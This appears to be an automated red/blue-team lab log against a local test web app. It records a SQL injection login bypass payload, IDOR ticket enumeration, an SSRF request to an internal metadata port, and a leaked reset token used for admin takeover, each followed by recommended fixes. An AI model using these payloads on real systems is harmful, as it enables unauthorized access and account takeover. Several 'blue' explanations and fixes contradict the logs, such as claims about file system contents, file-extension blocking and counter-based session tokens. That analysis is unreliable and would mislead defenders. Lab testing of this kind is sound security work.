engagements.label: SQL Injection
engagements.recon_tell: login form (username/password) builds a SQL query from raw input
recon_lines: GET /                      status=200  (tech tells: Werkzeug/3.1.8 Python/3.11.9; cookies: none)
GET /login                   status=405 content-type=application/json  (accepts POST; response: POST message='Invalid credentials')
engagements.window:
2026-10-30 09:14:19,886 LOGIN_ATTEMPT username="' OR '1'='1'" password='admin' query="SELECT username FROM users WHERE username = '' OR '1'='1'' AND password = 'admin'" error='near "admin": syntax error' result=NO_MATCH
2026-10-30 09:14:19,886 LOGIN_FAIL username="' OR '1'='1'"
2026-10-30 09:14:30,101 LOGIN_ATTEMPT username="' OR '1'='1' -- " password='admin' query="SELECT username FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'admin'" error=None result=MATCH
2026-10-30 09:14:30,101 LOGIN_SUCCESS username="' OR '1'='1' -- " matched_user='admin'

blue.recommended_fix: Replace the string concatenation strategy with a prepared statement that binds each identifier (username, password, etc.) using a library-specific API; don't rely on a regex to filter out keyword-like substrings.
blue.explanation: The same pattern - a literal string followed by a comment sequence indicating SQL escape - was used to pivot into the database's authentication system.

engagements.label: Insecure Direct Object Reference
engagements.recon_tell: /api/tickets/<id> — sequential numbered sub-resource, no ownership gate
recon_lines: GET /                      status=200  (tech tells: Werkzeug/3.1.8 Python/3.11.9; cookies: none)
GET /api/tickets             status=401 content-type=application/json  (id_shape=sequential; response: sub-resource /1 -> message='invalid or missing session token')
engagements.window:
2026-10-30 09:14:39,373 LOGIN_ATTEMPT username='' password='' query="SELECT username FROM users WHERE username = '' AND password = ''" error=None result=NO_MATCH
2026-10-30 09:14:39,373 LOGIN_FAIL username=''
2026-10-30 09:14:39,389 TICKET_ACCESS ticket_id=1 requester_id=1 owner_id=1 cross_owner=False result=SUCCESS
2026-10-30 09:14:47,848 LOGIN_ATTEMPT username='' password='' query="SELECT username FROM users WHERE username = '' AND password = ''" error=None result=NO_MATCH
2026-10-30 09:14:47,848 LOGIN_FAIL username=''
2026-10-30 09:14:47,865 TICKET_ACCESS ticket_id=4 requester_id=1 result=NOT_FOUND
2026-10-30 09:14:56,840 LOGIN_ATTEMPT username='' password='' query="SELECT username FROM users WHERE username = '' AND password = ''" error=None result=NO_MATCH
2026-10-30 09:14:56,840 LOGIN_FAIL username=''
2026-10-30 09:14:56,856 TICKET_ACCESS ticket_id=2 requester_id=1 owner_id=2 cross_owner=True result=SUCCESS

blue.recommended_fix: Compare the session owner_id against the ticket owner_id on each access attempt, and return an authorization error when they don't match (logout the user if necessary).
blue.explanation: The session for requester_id=1 was issued a token for owner_id=2 and was used to read ticket_id=2.

engagements.label: Server-Side Request Forgery
engagements.recon_tell: /preview fetches a client-supplied URL server-side (no host allowlist)
recon_lines: GET /                      status=200  (tech tells: Werkzeug/3.1.8 Python/3.11.9; cookies: none)
GET /preview                 status=405 content-type=application/json  (accepts POST; response: POST error="Invalid URL '': No scheme supplied. Perhaps you meant https://?")
engagements.window:
2026-10-30 09:15:05,665 PREVIEW_REQUEST url='http://127.0.0.1:5500/preview' status=405 error=None canary_leaked=False
2026-10-30 09:15:19,118 PREVIEW_REQUEST url='http://127.0.0.1:6000/admin-metadata' status=200 error=None canary_leaked=True

blue.threat_category: Server-Side Request Forgery (SSRF) - internal metadata service accessed
blue.recommended_fix: Block requests to localhost:6000 by IP range and file extension, then return a friendly web page when configured hosts allow it, proving external parties cannot reach this code path.
blue.explanation: The same endpoint ('admin-metadata') available at a different, internal port number revealed the file system contents of the server process (./secret/canary.txt). The difference between a test and a link is the latter can fetch files without user intervention.

engagements.label: Token Leak → Account Takeover (chain)
recon_lines: GET /                      status=200  (tech tells: Werkzeug/3.1.8 Python/3.11.9; cookies: none)

GET /api/reset-requests      status=200 content-type=application/json  (id_shape=sequential; response: sub-resource /1 -> issued a session token to a request with no credentials (keys: email, request_id, reset_token, status, user))
engagements.window:
2026-10-30 09:15:24,913 RESET_REQUEST_READ id=1 user=admin leaked_token=True result=SUCCESS
2026-10-30 09:15:27,899 RESET_REQUEST_READ id=2 user=jdoe leaked_token=False result=SUCCESS
2026-10-30 09:15:30,434 RESET_REQUEST_READ id=3 user=guest leaked_token=False result=SUCCESS
2026-10-30 09:15:33,131 RESET_REQUEST_READ id=4 result=NOT_FOUND
2026-10-30 09:15:37,258 RESET_REQUEST_READ id=5 result=NOT_FOUND
2026-10-30 09:15:40,556 RESET_REQUEST_READ id=6 result=NOT_FOUND
2026-10-30 09:15:42,908 RESET_COMPLETE token='RST-a7c3e9f1b2d64856' result=ADMIN_TAKEOVER

blue.recommended_fix: Generate session identifiers with sufficient entropy (a cryptographically secure random generator) rather than incrementing a counter, and bind each token to the account it was issued to.
blue.explanation: The same session-prediction pattern succeeded again with different cookie syntax, confirming the vulnerability is structural (the token scheme itself) rather than one unlucky guess.
